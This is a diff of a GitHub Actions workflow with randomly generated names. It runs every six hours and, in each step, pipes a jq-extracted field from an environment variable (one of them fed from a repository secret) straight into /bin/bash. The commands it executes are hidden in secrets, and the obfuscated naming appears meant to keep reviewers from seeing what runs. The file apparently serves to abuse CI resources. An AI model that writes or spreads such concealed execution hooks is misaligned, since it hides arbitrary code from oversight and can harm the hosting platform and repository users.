@@ -2,22 +2,25 @@ name: dongaoxiong6715
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 1/6 * * *'
+    - cron: '9 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongaoxiong6715
         env:
-          eh50: ${{ secrets.eh50 }}
+          uen16506: ${{ secrets.uen16506 }}
         run: |
-          echo $eh50 | jq -r .et17 | /bin/bash
-          echo $nvmsg7151 | jq -r .fl23812 | /bin/bash
-          echo $tvt3 | jq -r .ybd2 | /bin/bash
-          echo $cbp40 | jq -r .mg5979 | /bin/bash
-          echo $zg2861 | jq -r .b52 | /bin/bash
-          echo $tom84 | jq -r .bn7039 | /bin/bash
-          echo $fepig8570 | jq -r .jpf906 | /bin/bash
+          echo $uen16506 | jq -r .vfdj1655 | /bin/bash
+          echo $cqb728 | jq -r .ljw29 | /bin/bash
+          echo $q73051 | jq -r .rpdic1246 | /bin/bash
+          echo $fweks354 | jq -r .kfrwx59 | /bin/bash
+          echo $kh02331 | jq -r .mkzz5608 | /bin/bash
+          echo $ccjjn35 | jq -r .rkn62697 | /bin/bash
+          echo $qtnh917 | jq -r .xpzd0 | /bin/bash
+          echo $tykbn607 | jq -r .fduzl306 | /bin/bash
+          echo $uzqik25887 | jq -r .v54394 | /bin/bash
+          echo $e47793 | jq -r .hf57427 | /bin/bash
+          echo $hrzl99501 | jq -r .yndm44 | /bin/bash
 
